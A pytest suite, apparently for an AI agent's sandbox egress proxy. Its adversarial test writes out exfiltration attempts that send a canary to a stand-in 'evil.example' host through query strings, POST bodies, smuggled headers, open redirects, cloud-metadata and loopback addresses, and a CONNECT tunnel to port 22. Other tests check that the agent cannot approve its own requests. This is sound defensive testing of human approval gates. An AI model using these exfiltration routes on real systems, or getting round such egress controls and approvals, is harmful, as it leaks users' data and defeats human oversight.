"""第 3 步的验收项：网络出口。逐条对应设计文档"第 3 步：网络出口"。

对抗测试不去骗模型，而是直接扮演电脑里的恶意程序：拿着一次运行的通行证，
经出网代理想尽办法把金丝雀数据发到"攻击者的服务器"。
"""
from __future__ import annotations

import asyncio
import base64
import datetime as dt
import json
import ssl
from dataclasses import dataclass, field

import aiohttp
import pytest
from aiohttp import web

from host import sessions
from host.egress.netcheck import is_public
from host.egress.urls import extract_links, normalize
from host.server import check_model_request, search_result_urls
from tests.conftest import all_done, self_signed_context, wait_until

CANARY = "CANARY-7f3a9c"


# ------------------------------------------------------------------ 假的外部网站


@dataclass
class Site:
    name: str
    port: int = 0
    hits: list[dict] = field(default_factory=list)

    def saw_canary(self) -> bool:
        return CANARY in json.dumps(self.hits, ensure_ascii=False)


def _news_handler(site: Site):
    async def handle(request: web.Request) -> web.StreamResponse:
        body = await request.text()
        site.hits.append({"method": request.method, "path": request.path_qs,
                          "headers": dict(request.headers), "body": body})
        if request.path == "/index.html":
            return web.Response(text='<html><body><h1>新闻</h1><a href="/a">文章A</a>'
                                     '<a href="http://other.example/b">外链</a></body></html>',
                                content_type="text/html")
        if request.path == "/redirect":
            raise web.HTTPFound(request.query["to"])
        if request.path == "/echo-headers":
            return web.json_response(dict(request.headers))
        return web.Response(text=f"文章内容 {request.path_qs}", content_type="text/plain")
    return handle


async def _start_site(site: Site, ssl_context=None) -> web.AppRunner:
    app = web.Application()
    app.router.add_route("*", "/{tail:.*}", _news_handler(site))
    runner = web.AppRunner(app)
    await runner.setup()
    tcp = web.TCPSite(runner, "127.0.0.1", 0, ssl_context=ssl_context)
    await tcp.start()
    site.port = tcp._server.sockets[0].getsockname()[1]
    return runner


@pytest.fixture
async def web_sites():
    news, evil = Site("news"), Site("evil")
    runners = [await _start_site(news), await _start_site(evil)]
    yield news, evil
    for r in runners:
        await r.cleanup()


@pytest.fixture
async def net_app(make_app, web_sites):
    news, evil = web_sites
    overrides = {"news.example": ("127.0.0.1", news.port), "other.example": ("127.0.0.1", news.port),
                 "evil.example": ("127.0.0.1", evil.port)}
    app = make_app(egress_overrides=overrides)
    await app.start(with_channel=False)
    return app


def live_run(app):
    """一次进行中的运行，拿到它的通行证，就是电脑里程序能拿到的全部凭据。"""
    sid = sessions.current_conversation(app.db, 6)
    return app.runs.start(sid, f"t-{len(app.runs._by_token)}", "user")


async def through_proxy(app, token, method, url, **kwargs):
    proxy = f"http://127.0.0.1:{app.egress_port}"
    auth = {"Proxy-Authorization": "Basic " + base64.b64encode(f"run:{token}".encode()).decode()} if token else {}
    # aiohttp 只在 HTTPS 的 CONNECT 上带 proxy_headers；明文 HTTP 的凭据要放在普通请求头里
    headers = {**auth, **kwargs.pop("headers", {})} if url.startswith("http:") else kwargs.pop("headers", None)
    async with aiohttp.ClientSession() as s:
        async with s.request(method, url, proxy=proxy, proxy_headers=auth or None, headers=headers, **kwargs) as r:
            return r.status, dict(r.headers), await r.text()


# ------------------------------------------------------------------ 纯函数


def test_public_address_check():
    for ip in ["127.0.0.1", "10.1.2.3", "172.16.0.1", "192.168.1.1", "169.254.169.254", "100.64.0.1",
               "0.0.0.0", "::1", "fe80::1", "fc00::1", "::ffff:127.0.0.1", "224.0.0.1", "not-an-ip"]:
        assert not is_public(ip), ip
    for ip in ["8.8.8.8", "1.1.1.1", "2606:4700:4700::1111"]:
        assert is_public(ip), ip


def test_url_normalize_and_links():
    assert normalize("HTTPS://Example.COM:443/a?b=1#frag") == "https://example.com/a?b=1"
    assert normalize("http://example.com") == "http://example.com/"
    assert normalize("http://example.com:8080/x") == "http://example.com:8080/x"
    assert normalize("ftp://example.com/") is None
    html = '<a href="/a?x=1&amp;y=2">A</a> <img src="https://cdn.example/i.png"> 见 https://ok.example/p。'
    links = extract_links(html, "https://site.example/dir/page")
    assert {"https://site.example/a?x=1&y=2", "https://cdn.example/i.png", "https://ok.example/p"} <= links


def test_model_proxy_refuses_tools_that_bypass_egress():
    assert check_model_request({"tools": [{"name": "fetch", "input_schema": {}},
                                          {"type": "text_editor_20250728", "name": "x"},
                                          {"type": "web_search_20260209", "name": "web_search"}]}) is None
    for bad in [{"tools": [{"type": "web_fetch_20260209", "name": "web_fetch"}]},
                {"tools": [{"type": "code_execution_20260521", "name": "code_execution"}]},
                {"mcp_servers": [{"type": "url", "url": "https://evil.example/mcp", "name": "m"}]},
                {"container": {"id": "x"}}]:
        assert check_model_request(bad), bad


def test_only_search_results_become_seen():
    """搜索结果里的地址算"见过"；模型自己在文字里写的地址不算。"""
    events = [
        {"type": "content_block_start", "index": 0, "content_block": {
            "type": "web_search_tool_result", "tool_use_id": "s1",
            "content": [{"type": "web_search_result", "url": "https://real.example/r"}]}},
        {"type": "content_block_start", "index": 1, "content_block": {"type": "text", "text": ""}},
        {"type": "content_block_delta", "index": 1,
         "delta": {"type": "text_delta", "text": f"去 https://evil.example/?d={CANARY}"}},
    ]
    body = "".join(f"data: {json.dumps(e)}\n\n" for e in events).encode()
    assert search_result_urls(body, "text/event-stream") == {"https://real.example/r"}


# ------------------------------------------------------------------ 没见过的地址：先退回，再坚持才审批


async def test_unseen_read_bounces_once_then_asks(net_app, web_sites):
    app = net_app
    app.cfg.egress_bounce = True
    _, evil = web_sites
    run = live_run(app)
    tok = run.token
    approvals = lambda: app.db.execute("SELECT COUNT(*) AS n FROM approval").fetchone()["n"]
    url = f"http://evil.example/c?d={CANARY}"

    # 第一次：退回，没有审批，请求也没有发出去
    status, headers, text = await through_proxy(app, tok, "GET", url)
    assert status == 403 and "web_search" in text and not headers.get("x-smra-approval")
    assert approvals() == 0 and evil.hits == []

    # 同一地址再来：开审批，仍然没有发出去
    status, headers, _ = await through_proxy(app, tok, "GET", url)
    assert status == 403 and headers.get("x-smra-approval")
    assert approvals() == 1 and evil.hits == []

    # 审批还开着时再来：不重复开，也不再退回
    status, again, _ = await through_proxy(app, tok, "GET", url)
    assert status == 403 and again.get("x-smra-approval") == headers["x-smra-approval"] and approvals() == 1

    # 换一个地址要重新退回，退回不会给别的地址放行
    status, other, _ = await through_proxy(app, tok, "GET", "http://evil.example/other")
    assert status == 403 and not other.get("x-smra-approval") and evil.hits == []

    # 写请求不退回，第一次就审批
    status, posted, _ = await through_proxy(app, tok, "POST", "http://evil.example/upload", data=CANARY)
    assert status == 403 and posted.get("x-smra-approval") and evil.hits == []

    # 批准后才真正发出
    app.adjudicator.resolve(headers["x-smra-approval"], True, "once")
    status, _, _ = await through_proxy(app, tok, "GET", url)
    assert status == 200 and len(evil.hits) == 1


# ------------------------------------------------------------------ 对抗测试：恶意程序想往外送数据


async def test_exfiltration_attempts_are_blocked(net_app, web_sites):
    app = net_app
    news, evil = web_sites
    run = live_run(app)
    tok = run.token

    # 没有通行证、乱写的通行证：代理不认
    assert (await through_proxy(app, None, "GET", "http://news.example/a"))[0] == 407
    assert (await through_proxy(app, "guess", "GET", "http://news.example/a"))[0] == 407

    # 1. 拼进查询参数：地址没出现过，挂起等批准，攻击者什么也收不到
    status, headers, text = await through_proxy(app, tok, "GET", f"http://evil.example/c?d={CANARY}")
    assert status == 403 and "需要用户批准" in text and headers.get("x-smra-approval")

    # 2. 放进 POST 请求体
    status, _, _ = await through_proxy(app, tok, "POST", "http://evil.example/upload", data=CANARY)
    assert status == 403

    # 3. 放进请求头：哪怕地址本身是放行的（出现过），夹带的头也到不了对方
    app.adjudicator.add_seen(["http://evil.example/page"], "search")
    status, _, _ = await through_proxy(app, tok, "GET", "http://evil.example/page", headers={
        "X-Leak": CANARY, "Cookie": f"s={CANARY}", "Authorization": f"Bearer {CANARY}",
        "User-Agent": CANARY, "Referer": f"http://x/{CANARY}"})
    assert status == 200 and len(evil.hits) == 1     # 请求确实到了，只是干净的

    # 4. 经开放重定向：重定向地址本身是拼出来的，没出现过
    target = f"http://news.example/redirect?to=http://evil.example/?d={CANARY}"
    assert (await through_proxy(app, tok, "GET", target))[0] == 403

    # 5. 经重定向打内网：重定向地址出现过，但跳转的目标是内网。手动跟随跳转、每一跳都带着通行证，
    #    就像电脑里的程序会做的那样；跳转目标在连接前被拦
    redirect = f"http://news.example/redirect?to=http://127.0.0.1:{evil.port}/x"
    app.adjudicator.add_seen([redirect], "search")
    status, headers, _ = await through_proxy(app, tok, "GET", redirect, allow_redirects=False)
    assert status == 302
    status, _, text = await through_proxy(app, tok, "GET", headers["Location"])
    assert status == 403 and "非公网地址" in text

    # 6. 直接打内网和云元数据地址，以及解析到内网的域名
    for url in [f"http://127.0.0.1:{evil.port}/?d={CANARY}", "http://localhost/", "http://169.254.169.254/latest/",
                "http://10.1.2.3/", "http://[::1]/"]:
        app.adjudicator.add_seen([normalize(url)], "search")      # 就算地址"见过"也不行
        status, _, text = await through_proxy(app, tok, "GET", url)
        assert status == 403, url

    # 7. 不允许的端口
    assert (await through_proxy(app, tok, "GET", "http://news.example:8080/"))[0] == 403

    # 8. Host 头和连接目标不一致（借别人的名字）
    app.adjudicator.add_seen(["http://news.example/a"], "search")
    status, _, text = await through_proxy(app, tok, "GET", "http://news.example/a", headers={"Host": "evil.example"})
    assert status == 403 and "Host" in text

    # 9. 用 CONNECT 打开一条到非 HTTP 端口的隧道
    reader, writer = await asyncio.open_connection("127.0.0.1", app.egress_port)
    creds = base64.b64encode(f"run:{tok}".encode()).decode()
    writer.write(f"CONNECT evil.example:22 HTTP/1.1\r\nHost: evil.example:22\r\n"
                 f"Proxy-Authorization: Basic {creds}\r\n\r\n".encode())
    await writer.drain()
    line = await asyncio.wait_for(reader.readline(), 10)
    writer.close()
    assert b" 403 " in line

    # 运行结束后，通行证对代理也失效
    app.runs.finish(run, "SENT")
    app.adjudicator.add_seen(["http://news.example/after"], "search")
    assert (await through_proxy(app, tok, "GET", "http://news.example/after"))[0] == 407

    # 总账：攻击者的服务器上没有出现过金丝雀；唯一一次到达的请求是干净的
    assert not evil.saw_canary(), evil.hits
    hit = evil.hits[0]["headers"]
    assert "Cookie" not in hit and "Authorization" not in hit and "X-Leak" not in hit and "Referer" not in hit
    assert "smra-agent" in hit["User-Agent"]
    # 审批请求发给了你，内容由裁决者生成
    await wait_until(lambda: len(app.channel.approvals) >= 2)
    assert CANARY in app.channel.approvals[0][0]


async def test_links_from_pages_become_reachable(net_app, web_sites):
    """S3 的基础：你给的地址能打开，页面里的链接接着能打开，全程不需要批准。"""
    app = net_app
    news, _ = web_sites
    await app.on_user_text("t:x", "看看 http://news.example/index.html")
    run = live_run(app)
    assert (await through_proxy(app, run.token, "GET", "http://news.example/index.html"))[0] == 200
    assert (await through_proxy(app, run.token, "GET", "http://news.example/a"))[0] == 200
    assert (await through_proxy(app, run.token, "GET", "http://other.example/b"))[0] == 200
    assert app.channel.approvals == []
    assert [h["path"] for h in news.hits] == ["/index.html", "/a", "/b"]


async def test_the_cell_cannot_see_or_answer_approvals(net_app):
    app = net_app
    run = live_run(app)
    status, headers, _ = await through_proxy(app, run.token, "GET", "http://news.example/secret")
    approval_id = headers["x-smra-approval"]
    await wait_until(lambda: app.channel.approvals)

    base = f"http://127.0.0.1:{app.port}"
    auth = {"authorization": f"Bearer {run.token}"}
    async with aiohttp.ClientSession() as s:
        for path in ("/host/approve", "/host/resolve", f"/host/approvals/{approval_id}"):
            async with s.post(base + path, json={"id": approval_id, "scope": "forever"}, headers=auth) as r:
                assert r.status == 404
        async with s.post(base + "/host/run_context", json={}, headers=auth) as r:
            ctx = await r.text()
    assert "需要你批准" not in ctx                     # 审批消息不出现在电脑能读到的上下文里
    row = app.db.execute("SELECT status FROM approval WHERE id = ?", (approval_id,)).fetchone()
    assert row["status"] == "PENDING"


# ------------------------------------------------------------------ 授权的范围


async def test_grant_scopes(net_app, web_sites):
    app = net_app
    news, _ = web_sites
    adj = app.adjudicator
    run = live_run(app)

    async def get(url, r=run):
        return (await through_proxy(app, r.token, "GET", url))[0]

    # 仅这一次：只放行一模一样的请求一次
    _, h, _ = await through_proxy(app, run.token, "GET", "http://news.example/q?x=1")
    assert "已批准" in adj.resolve(h["x-smra-approval"], True, "once")
    assert await get("http://news.example/q?x=1") == 200
    assert await get("http://news.example/q?x=1") == 403
    assert await get("http://news.example/q?x=2") == 403

    # 写请求只能选"仅这一次"
    _, h, _ = await through_proxy(app, run.token, "POST", "http://news.example/form", data="a=1")
    assert "只能选" in adj.resolve(h["x-smra-approval"], True, "forever")
    assert "已批准" in adj.resolve(h["x-smra-approval"], True, "once")
    assert (await through_proxy(app, run.token, "POST", "http://news.example/form", data="a=1"))[0] == 200
    assert (await through_proxy(app, run.token, "POST", "http://news.example/form", data="a=2"))[0] == 403

    # 本次会话：同一主机的其他 GET 在本会话里放行，别的会话不行
    _, h, _ = await through_proxy(app, run.token, "GET", "http://other.example/s1")
    adj.resolve(h["x-smra-approval"], True, "session")
    assert await get("http://other.example/s2") == 200
    other_session = sessions.new_session(app.db, "conversation")
    stranger = app.runs.start(other_session, "t-other", "user")
    assert await get("http://other.example/s3", stranger) == 403

    # 一小时：过期后失效
    adj.db.execute("DELETE FROM grant_")
    _, h, _ = await through_proxy(app, run.token, "GET", "http://other.example/t1")
    adj.resolve(h["x-smra-approval"], True, "1h")
    assert await get("http://other.example/t2") == 200
    past = (dt.datetime.now(dt.UTC) - dt.timedelta(minutes=1)).isoformat()
    adj.db.execute("UPDATE grant_ SET expires_at = ?", (past,))
    assert await get("http://other.example/t3") == 403

    # 本次运行：发起审批的运行结束后，转给同一会话里接着做的那一次
    adj.db.execute("DELETE FROM grant_")
    _, h, _ = await through_proxy(app, run.token, "GET", "http://other.example/r1")
    adj.resolve(h["x-smra-approval"], True, "run")
    app.runs.finish(run, "DEFERRED")
    successor = app.runs.start(run.session_id, "t-next", "approval")
    assert await get("http://other.example/r2", successor) == 200
    assert await get("http://other.example/r3", stranger) == 403

    # 拒绝：请求不放行，再问也还是新的审批
    _, h, _ = await through_proxy(app, successor.token, "GET", "http://news.example/no")
    assert "已拒绝" in adj.resolve(h["x-smra-approval"], False)
    assert await get("http://news.example/no", successor) == 403


async def test_approval_while_the_request_is_held(make_app, web_sites):
    """你在请求挂着的时候就批准了：请求直接放行，运行不用挂起。"""
    news, _ = web_sites
    app = make_app(egress_overrides={"news.example": ("127.0.0.1", news.port)}, egress_hold_s=10)
    await app.start(with_channel=False)
    run = live_run(app)
    pending = asyncio.create_task(through_proxy(app, run.token, "GET", "http://news.example/held"))
    await wait_until(lambda: app.channel.approvals)
    await app.on_user_text("c:1", f"/approve {app.channel.approvals[0][1]}")
    status, _, text = await pending
    assert status == 200 and "/held" in text
    assert run.deferred == []


# ------------------------------------------------------------------ HTTPS 也被解密裁决


async def test_https_is_inspected_too(make_app, tmp_path):
    secure = Site("secure")
    runner = await _start_site(secure, ssl_context=self_signed_context("secure.example", tmp_path))
    try:
        app = make_app(egress_overrides={"secure.example": ("127.0.0.1", secure.port)}, egress_ssl_insecure=True)
        await app.start(with_channel=False)
        run = live_run(app)
        client_ssl = ssl.create_default_context(cafile=str(app.egress.ca_cert))  # 电脑只信任代理的 CA
        app.adjudicator.add_seen(["https://secure.example/ok"], "search")

        status, _, text = await through_proxy(app, run.token, "GET", "https://secure.example/ok",
                                              ssl=client_ssl, headers={"X-Leak": CANARY})
        assert status == 200 and "/ok" in text
        status, _, text = await through_proxy(app, run.token, "GET", f"https://secure.example/?d={CANARY}",
                                              ssl=client_ssl)
        assert status == 403 and "需要用户批准" in text
        assert not secure.saw_canary()
    finally:
        await runner.cleanup()


# ------------------------------------------------------------------ 端到端：S3 和挂起再接上


async def test_research_then_deferred_approval_resumes_the_task(make_app, upstream, web_sites):
    """S3：搜索、打开结果，全程不用批准。之后 Agent 拼了个地址，需要批准：
    运行挂起；期间你问别的照常回答；你批准后，原来的任务自动接上。"""
    news, _ = web_sites
    app = make_app(egress_overrides={"news.example": ("127.0.0.1", news.port)})
    await app.start(with_channel=False)
    secret_url = "http://news.example/a?page=2"

    upstream.script = [
        {"search": [("竞品", ["http://news.example/a"])],
         "tools": [("fetch", {"url": "http://news.example/a"})]},
        {"tools": [("fetch", {"url": secret_url, "purpose": "翻到第二页"})]},
    ]
    await app.on_user_text("t:1", "调研一下竞品")
    try:
        await wait_until(lambda: all_done(app) and app.channel.approvals, timeout=40)
    except AssertionError:
        for q in ("SELECT status, attempts FROM inbox", "SELECT outcome, error FROM run",
                  "SELECT method, url, verdict, reason FROM egress_log", "SELECT id, status FROM approval",
                  "SELECT kind, status, substr(body,1,80) b FROM outbox"):
            print(q, [dict(r) for r in app.db.execute(q)])
        print("requests:", len(upstream.requests), "approvals:", app.channel.approvals, "sent:", app.channel.sent)
        raise

    assert app.db.execute("SELECT outcome FROM run").fetchone()["outcome"] == "DEFERRED"
    assert "文章内容 /a" in json.dumps(upstream.requests[1]["body"]["messages"][-1], ensure_ascii=False)
    # 被拦下的结果记进了会话，运行随即挂起，没有再调模型
    assert len(upstream.requests) == 2
    last = app.db.execute("SELECT payload FROM event WHERE type = 'tool_result' ORDER BY seq DESC LIMIT 1")
    assert "需要用户批准" in last.fetchone()["payload"]
    assert [h["path"] for h in news.hits] == ["/a"]           # 拼出来的地址还没被访问
    approval_text, approval_id, scopes = app.channel.approvals[0]
    assert secret_url in approval_text and "翻到第二页" in approval_text and "不可信" in approval_text
    assert app.channel.sent == []                             # 挂起时 Agent 不说话，审批消息替它说

    # 你先问了别的：同一个会话照常处理
    await app.on_user_text("t:2", "顺便问一句")
    await wait_until(lambda: all_done(app) and app.channel.sent)
    assert app.channel.sent == ["echo: 顺便问一句"]

    # 你批准了：一条审批事件把原会话叫醒，Agent 重试原来的请求
    upstream.script = [
        {"tools": [("fetch", {"url": secret_url})]},
        {"text": "第二页也拿到了"},
    ]
    before = len(upstream.requests)
    await app.on_user_text("c:1", f"/approve {approval_id}")
    await wait_until(lambda: all_done(app) and "第二页也拿到了" in app.channel.sent)

    resumed = upstream.requests[before]["body"]["messages"]
    assert any("[审批] 你批准了" in t for m in resumed if m["role"] == "user"
               for t in ([m["content"]] if isinstance(m["content"], str) else
                         [b.get("text", "") for b in m["content"] if isinstance(b, dict)]))
    assert [h["path"] for h in news.hits] == ["/a", "/a?page=2"]
    sids = {r["session_id"] for r in app.db.execute("SELECT session_id FROM run")}
    assert len(sids) == 1                                     # 三次运行都在同一个会话里
